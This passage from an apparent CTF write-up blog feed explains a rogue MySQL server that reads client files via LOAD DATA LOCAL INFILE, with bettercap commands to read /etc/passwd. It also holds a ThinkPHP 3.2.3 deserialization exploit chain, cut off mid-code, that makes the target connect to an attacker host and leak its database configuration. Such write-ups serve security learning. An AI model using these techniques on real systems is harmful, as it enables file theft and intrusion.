&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">cookieHandler&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">c&lt;/span> &lt;span style="color:#f92672">*&lt;/span>&lt;span style="color:#75af00">gin&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Context&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">session&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#75af00">sessions&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Default&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">c&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Set&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#d88200">&amp;#34;uname&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#d88200">&amp;#34;admin&amp;#34;&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#75715e">// ä¿®æ”¹å¤„
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#75af00">session&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Save&lt;/span>&lt;span style="color:#111">()&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">func&lt;/span> &lt;span style="color:#75af00">randomChar&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">l&lt;/span> &lt;span style="color:#00a8c8">int&lt;/span>&lt;span style="color:#111">)&lt;/span> &lt;span style="color:#111">[]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span> &lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">output&lt;/span> &lt;span style="color:#f92672">:=&lt;/span> &lt;span style="color:#111">make&lt;/span>&lt;span style="color:#111">([]&lt;/span>&lt;span style="color:#00a8c8">byte&lt;/span>&lt;span style="color:#111">,&lt;/span> &lt;span style="color:#75af00">l&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">rand&lt;/span>&lt;span style="color:#111">.&lt;/span>&lt;span style="color:#75af00">Read&lt;/span>&lt;span style="color:#111">(&lt;/span>&lt;span style="color:#75af00">output&lt;/span>&lt;span style="color:#111">)&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">return&lt;/span> &lt;span style="color:#75af00">output&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span> &lt;span style="color:#75715e">// ä¼ªéšæœº
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h3 id="vnctf-2022gocalc0">[VNCTF 2022]gocalc0&lt;/h3>
&lt;p>æ®è¯´æ˜¯yè€å¸ˆå‡ºé¢˜æœ‰è¯¯ï¼Œå¯¼è‡´å¼‚å¸¸ç®€å•&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220213002805727.png" alt="image-20220213002805727">&lt;/p>
&lt;p>emmmm&lt;/p>
&lt;h2 id="go111-netheepå­˜åœ¨crlfæ¼æ´">go&amp;lt;=1.11 net/heepå­˜åœ¨CRLFæ¼æ´&lt;/h2>
&lt;p>&lt;a href="https://github.com/go/go/issues/30794">https://github.com/go/go/issues/30794&lt;/a>&lt;/p>
&lt;h3 id="wmctf2020gogogo-1">[WMCTF2020]GOGOGO&lt;/h3>
&lt;p>å‚è€ƒï¼š&lt;a href="https://annevi.cn/2020/08/14/wmctf2020-gogogo-writeup/">wp&lt;/a>&lt;/p></description></item><item><title>MySQLä¼ªæœåŠ¡ç«¯è¯»å®¢æˆ·ç«¯ä»»æ„æ–‡ä»¶</title><link>https://amiaaaz.github.io/2021/12/19/mysql-pseudo-server/</link><pubDate>Sun, 19 Dec 2021 20:22:54 +0800</pubDate><guid>https://amiaaaz.github.io/2021/12/19/mysql-pseudo-server/</guid><description>&lt;p>åº”è¯¥æ˜¯å„ä½å¸¦å¸ˆå‚…ä»¬æ—©å°±ä¼šçš„ç‚¹äº†ï¼Œåšé¢˜ç¢°åˆ°äº†æ‹¿å‡ºæ¥ç‚’ä¸ªå†·é¥­QwQï¼›å‚è€ƒé“¾æ¥ç»Ÿä¸€æ”¾åˆ°æœ€åé¢å•¦&lt;/p>
&lt;h2 id="åŸç†å¤ç°">åŸç†&amp;amp;å¤ç°&lt;/h2>
&lt;p>æ€»ä½“æ€è·¯æ˜¯è¿™æ ·çš„ï¼šä¼ªé€ ä¸€ä¸ªmysqlçš„æœåŠ¡ç«¯ï¼ˆä¸éœ€è¦æœ‰å®Œæ•´çš„æ•°æ®åº“çš„åŠŸèƒ½ åªéœ€å‘å®¢æˆ·ç«¯å›å¤greeting packageï¼‰å½“æœ‰å®¢æˆ·ç«¯è¿æ¥åˆ°æ—¶ï¼Œå¯ä»¥è¢«æœåŠ¡ç«¯è®¿é—®ä¸€ä¸ªå®¢æˆ·ç«¯æœ¬åœ°çš„æ–‡ä»¶ï¼ˆå¦‚æœæœ¬åœ°ç”¨æˆ·æƒé™å…è®¸çš„è¯&lt;/p>
&lt;p>å¸®åŠ©æˆ‘ä»¬å®ç°è¿™ä¸€ç›®æ ‡çš„sqlè¯­å¥æ˜¯&lt;code>LOAD DATA INFILE&lt;/code>ï¼Œå®ƒç”¨äºè¯»å–ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹æ”¾å…¥è¡¨ä¸­ï¼Œæœ‰ä¸¤ç§å½¢å¼&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-mysql" data-lang="mysql">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">Load&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#00a8c8">infile&lt;/span> &lt;span style="color:#d88200">&amp;#34;/data/data.csv&amp;#34;&lt;/span> &lt;span style="color:#00a8c8">into&lt;/span> &lt;span style="color:#00a8c8">table&lt;/span> &lt;span style="color:#111">TestTable&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">Load&lt;/span> &lt;span style="color:#111">data&lt;/span> &lt;span style="color:#111">local&lt;/span> &lt;span style="color:#00a8c8">infile&lt;/span> &lt;span style="color:#d88200">&amp;#34;/data/data.csv&amp;#34;&lt;/span> &lt;span style="color:#00a8c8">into&lt;/span> &lt;span style="color:#00a8c8">table&lt;/span> &lt;span style="color:#111">TestTable&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># æœ‰æ—¶ä¸FIELDS TERMINATED BY &amp;#39;\n&amp;#39;ä¸€èµ·ä½¿ç”¨
&lt;/span>&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>ä»¥ä¸Šä¸¤ç§å†™æ³•çš„å·®å¼‚åœ¨äºæ˜¯å¦æœ‰&lt;code>local&lt;/code>ï¼Œä¹Ÿå°±æ˜¯æ˜¯å¦è¯»å–clientæœ¬åœ°çš„æ–‡ä»¶&lt;/p>
&lt;p>&lt;img src="https://lightless-blog.oss-cn-shanghai.aliyuncs.com/zybuluo-backup/lightless/2bsdse1b1cf6g999bhhcyz9y/image.png" alt="æ¥è‡ªå®˜æ–¹æ–‡æ¡£">&lt;/p>
&lt;p>åœ¨æœ¬åœ°ç”¨wiresharkæŠ“ä¸ªåŒ…åº·åº·è¿™ä¸€sqlè¯­å¥å…·ä½“æ˜¯æ€ä¹ˆæ‰§è¡Œçš„&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210702113235801.png" alt="image-20210702113235801">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210702113241427.png" alt="image-20210702113241427">&lt;/p>
&lt;p>ï¼ˆè‚¥è‚ æ„ä¹‰ä¸æ˜çš„æˆªå›¾ï¼ˆäº”ä¸ªæœˆè¿‡å»äº† èƒ½è®°å¾—æ‰æœ‰é¬¼&lt;/p>
&lt;p>æ•´ä¸ªè¿‡ç¨‹ç®€åŒ–ä¸ºä»¥ä¸‹ä¸‰ä¸ªé˜¶æ®µ&lt;/p>
&lt;ul>
&lt;li>Client: Request Query: LOAD DATA LOCAL INFIEL &amp;lsquo;/etc/passwd&amp;rsquo; INTO TABLE test FIELDS TERMINATED BY &amp;lsquo;\n&amp;rsquo;&lt;/li>
&lt;li>Server: Response TABULAR: /etc/passwd&lt;/li>
&lt;li>Client: Request[Malformed Packet]: content of /etc/passwd&lt;/li>
&lt;/ul>
&lt;p>å¦‚æœåœ¨å®¢æˆ·ç«¯å‘é€æŸ¥è¯¢å è¿”å›ä¸€ä¸ª&lt;code>Response TABULAR&lt;/code>åŒ… å¹¶æŒ‡å®šè¦è¯»å–çš„æ–‡ä»¶ å°±å¯ä»¥ä»»æ„è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶äº†ï¼ˆå‰æä»ç„¶æ˜¯have read accessï¼‰&lt;/p>
&lt;p>ç”šè‡³ä¸ä¸€å®šéœ€è¦å®¢æˆ·ç«¯é¦–å…ˆå‘èµ· &lt;code>LOAD DATA LOCAL&lt;/code>çš„è¯·æ±‚æ‰èƒ½responseï¼Œåœ¨å®˜æ–¹æ–‡æ¡£ç¬¬ä¸‰æ®µçš„æœ€åçš„æ‹¬å·ä¸­æç¤ºï¼Œä¼ªé€ çš„å®¢æˆ·ç«¯å¯ä»¥åœ¨ä»»ä½•æ—¶å€™å›å¤ä¸€ä¸ª&lt;code>file-transfer&lt;/code>çš„è¯·æ±‚ï¼ˆä½†åˆ©ç”¨è¿™ä¸ªç‰¹æ€§å‰ å®¢æˆ·ç«¯å¿…é¡»å…·æœ‰&lt;code>CLIENT_LOCAL_FILES&lt;/code>å±æ€§ ï¼ˆå¯ä»¥åœ¨è¿æ¥mysqlæ—¶æ·»åŠ  &lt;code>--enable-local-infile&lt;/code> æˆ–è®¾ç½®&lt;code>local_infile=ON&lt;/code>&lt;/p>
&lt;p>æ‰€ä»¥ä¸€æ—¦æœ‰ä¸€å°æ¶æ„çš„mysqlæœåŠ¡å™¨ å‘å‡ºå®Œå…¨ç›¸åŒçš„æ•°æ®åŒ…å»æ¨¡æ‹Ÿåˆå§‹çš„greetingæ¡æ‰‹è¿‡ç¨‹ï¼Œä¹‹åç­‰å¾…ä¸€ä¸ªå®¢æˆ·ç«¯çš„å“åº”ï¼ˆå¹¸è¿çš„æ˜¯å¤§å¤šæ•°MySQLå®¢æˆ·ç«¯ä»¥åŠç¨‹åºåº“éƒ½ä¼šåœ¨æ¡æ‰‹ä¹‹åè‡³å°‘å‘é€ä¸€æ¬¡è¯·æ±‚ï¼Œä»¥æ¢æµ‹ç›®æ ‡å¹³å°çš„æŒ‡çº¹ä¿¡æ¯ï¼Œæ¯”å¦‚ï¼ˆ&lt;code>select @@version_comment limit 1&lt;/code>ï¼‰ï¼Œå†ä¹‹åå°±å¯ä»¥ä¼ªé€ &lt;code>load data local infile&lt;/code>æŒ‡ä»¤æ¥è·å–æ–‡ä»¶äº†&lt;/p>
&lt;p>æˆ‘ä»¬æ„é€ ä¸€ä¸ªå…·æœ‰ä»¥ä¸‹å±æ€§çš„mysqlä¼ªæœåŠ¡ç«¯ï¼š&lt;/p>
&lt;ul>
&lt;li>å‘é€Server Greeting&lt;/li>
&lt;li>ç­‰å¾…client: Request Query package&lt;/li>
&lt;li>å›å¤è¯·æ±‚Response file-transfer&lt;/li>
&lt;/ul>
&lt;p>éœ€è¦å‘çš„åŒ…æ ¼å¼éƒ½åœ¨å®˜æ–¹æ–‡æ¡£ä¸Šå¯ä»¥æ‰¾åˆ°ï¼š&lt;a href="https://dev.mysql.com/doc/internals/en/com-query-response.html#packet-Protocol::LOCAL_INFILE_Request">Protocol::LOCAL_INFILE_Request&lt;/a> &lt;a href="https://dev.mysql.com/doc/internals/en/connection-phase-packets.html#packet-Protocol::Handshake">Protocol::Handshake&lt;/a>&lt;/p>
&lt;p>å‡ ä¸ªå·²ç»é›†æˆè¿‡çš„ä¼ªé€ server: &lt;a href="https://github.com/bettercap/bettercap">bettercap&lt;/a> &lt;a href="https://github.com/allyshka/Rogue-MySql-Server">Rogue-MySql-Server&lt;/a>&lt;/p>
&lt;p>å¯ä»¥ç”¨bettercapè¿›è¡Œå®Œç¾å®è·µ&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20210702175622262.png" alt="image-20210702175622262">&lt;/p>
&lt;p>éœ€è¦è®¾ç½®çš„é¡¹éå¸¸ç®€å•&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">set&lt;/span> mysql.server.address 0.0.0.0 &lt;span style="color:#75715e"># å¦‚æœæƒ³ç”¨npsä¹‹ç±»çš„ä»£ç†å·¥å…·æ˜ å°„åˆ°å…¬ç½‘ç«¯å£è¯·åŠ¡å¿…è®¾ç½®æ­¤é¡¹&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">set&lt;/span> mysql.server.infile /etc/passwd &lt;span style="color:#75715e"># æƒ³è¦è¯»å–çš„æ–‡ä»¶&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">set&lt;/span> mysql.server.outfile /xxxx &lt;span style="color:#75715e"># ä¿å­˜åˆ°æœ¬åœ°çš„ä½ç½®&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">set&lt;/span> mysql.server.port 1099 &lt;span style="color:#75715e"># éšæ„ç«¯å£éƒ½å¯ä»¥&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mysql.server on
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="çº¢æ˜è°·ctf-2021easytp">[çº¢æ˜è°·CTF 2021]EasyTP&lt;/h2>
&lt;p>tp3.2.3ï¼Œæœ‰ä¸€ä¸ªç°æˆçš„é“¾å­ï¼š&lt;a href="https://f5.pm/go-53579.html">ThinkPHP v3.2.* ï¼ˆSQLæ³¨å…¥&amp;amp;æ–‡ä»¶è¯»å–ï¼‰ååºåˆ—åŒ–POPé“¾&lt;/a>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219155134609.png" alt="image-20211219155134609">&lt;/p>
&lt;p>çœ‹Application\Home\Controller\IndexController.class.phpçš„ä»£ç ä¹Ÿè·Ÿè¿™ä¸ªæ–‡ç« ä¸­çš„ç¤ºä¾‹ä»£ç å¤§å·®ä¸å·®ï¼Œé¡ºç€è¿™ç¯‡æ–‡ç« çš„æ€è·¯è·Ÿä¸€ä¸‹&lt;/p>
&lt;p>é¦–å…ˆæ˜¯å…¨å±€å¯»æ‰¾&lt;code>__destruct()&lt;/code>å‡½æ•°&lt;/p>
&lt;p>www/ThinkPHP/Library/Think/Image/Driver/Imagick.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163343446.png" alt="image-20211219163343446">&lt;/p>
&lt;p>å¯»æ‰¾ä¸€ä¸ª&lt;code>destroy()&lt;/code>&lt;/p>
&lt;p>www/ThinkPHP/Library/Think/Session/Driver/Memcache.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163445086.png" alt="image-20211219163445086">&lt;/p>
&lt;p>è¿™é‡Œéœ€è¦ä¸€ä¸ª&lt;code>$sessID&lt;/code>ï¼ŒPHP7ä¸‹ä¸ä¼ å‚ä¼šæŠ¥é”™ PHP5ä¸å½±å“ï¼Œ&lt;code>$this-&amp;gt;sessionName&lt;/code>å¯æ§ï¼›æ¥ç€æ‰¾å«æœ‰&lt;code>delete()&lt;/code>çš„ç±»&lt;/p>
&lt;p>www/ThinkPHP/Mode/Lite/Model.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163653936.png" alt="image-20211219163653936">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219163713363.png" alt="image-20211219163713363">&lt;/p>
&lt;p>ç›¸å½“äºä¼ å…¥çš„å‚æ•°éƒ½å¯ç”¨ï¼Œå¯ä»¥æ§åˆ¶è‡ªå¸¦çš„æ•°æ®åº“ç±»çš„&lt;code>delete()&lt;/code>æ–¹æ³•äº†&lt;/p>
&lt;p>www/ThinkPHP/Library/Think/Db/Driver.class.php&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219170053771.png" alt="image-20211219170053771">&lt;/p>
&lt;p>å®ƒæ˜¯æ‹¼æ¥äº†$sqlè¯­å¥ï¼Œä¹‹åæ‰§è¡Œ&lt;code>$this-&amp;gt;execute()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219171035987.png" alt="image-20211219171035987">&lt;/p>
&lt;p>å®ƒä¼šé¢„å…ˆè¿›è¡Œ&lt;code>$this-&amp;gt;initConnect()&lt;/code>&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219171103370.png" alt="image-20211219171103370">&lt;/p>
&lt;p>&lt;img src="https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20211219171123961.png" alt="image-20211219171123961">&lt;/p>
&lt;p>æˆ‘ä»¬å¯ä»¥æ§åˆ¶&lt;code>$config&lt;/code>ï¼Œæ§åˆ¶è¿æ¥ä»»æ„æ•°æ®åº“&lt;/p>
&lt;p>è¿™é‡Œå¯ä»¥ç»“åˆä¸Šé¢çš„mysqlä¼ªæœåŠ¡ç«¯ä»»æ„æ–‡ä»¶è¯»å–äº†ï¼Œæ¯”å¦‚ä»¥ä¸‹çš„åˆ©ç”¨æµç¨‹ï¼š&lt;/p>
&lt;ul>
&lt;li>é€šè¿‡æŸå¤„æ³„éœ²å¾—åˆ°ç›®æ ‡çš„WEBç›®å½•ï¼ˆå¦‚DEBUGé¡µé¢&lt;/li>
&lt;li>å¼€å¯MySQLä¼ªæœåŠ¡ç«¯ï¼Œè¯»å–ç›®æ ‡çš„æ•°æ®åº“é…ç½®æ–‡ä»¶&lt;/li>
&lt;li>å‡ºå‘ååºåˆ—åŒ–&lt;/li>
&lt;li>è§¦å‘PDOè¿æ¥éƒ¨åˆ†&lt;/li>
&lt;li>è·å–åˆ°ç›®æ ‡çš„æ•°æ®åº“é…ç½®æ–‡ä»¶&lt;/li>
&lt;/ul>
&lt;p>ç”¨bettercapåšmysqlä¼ªæœåŠ¡ç«¯è¯»ä¸€ä¸‹/etc/passwd&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#272822;background-color:#fafafa;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-php" data-lang="php">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;lt;?&lt;/span>&lt;span style="color:#75af00">php&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Mysql&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$options&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#75af00">PDO&lt;/span>&lt;span style="color:#f92672">::&lt;/span>&lt;span style="color:#75af00">MYSQL_ATTR_LOCAL_INFILE&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#00a8c8">true&lt;/span> &lt;span style="color:#75715e">// å¼€å¯æ‰èƒ½è¯»å–æ–‡ä»¶
&lt;/span>&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">&lt;/span> &lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$config&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">array&lt;/span>&lt;span style="color:#111">(&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;debug&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;database&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;hostname&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;your_vps&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;hostport&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;port&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;charset&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;utf8&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;username&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>&lt;span style="color:#111">,&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#d88200">&amp;#34;password&amp;#34;&lt;/span> &lt;span style="color:#f92672">=&amp;gt;&lt;/span> &lt;span style="color:#d88200">&amp;#34;root&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">);&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Image\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver\Memcache&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Imagick&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">private&lt;/span> &lt;span style="color:#111">$img&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">img&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think\Session\Driver&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Model&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Memcache&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">protected&lt;/span> &lt;span style="color:#111">$handle&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">public&lt;/span> &lt;span style="color:#00a8c8">function&lt;/span> &lt;span style="color:#111">__construct&lt;/span>&lt;span style="color:#111">(){&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">$this&lt;/span>&lt;span style="color:#f92672">-&amp;gt;&lt;/span>&lt;span style="color:#75af00">handle&lt;/span> &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#00a8c8">new&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">();&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#111">}&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#00a8c8">namespace&lt;/span> &lt;span style="color:#75af00">Think&lt;/span>&lt;span style="color:#111">{&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">use&lt;/span> &lt;span style="color:#75af00">Think\Db\Driver\Mysql&lt;/span>&lt;span style="color:#111">;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#00a8c8">class&lt;/span> &lt;span style="color:#75af00">Model&lt;/span>&lt;span style="color:#111">{&lt;/span>
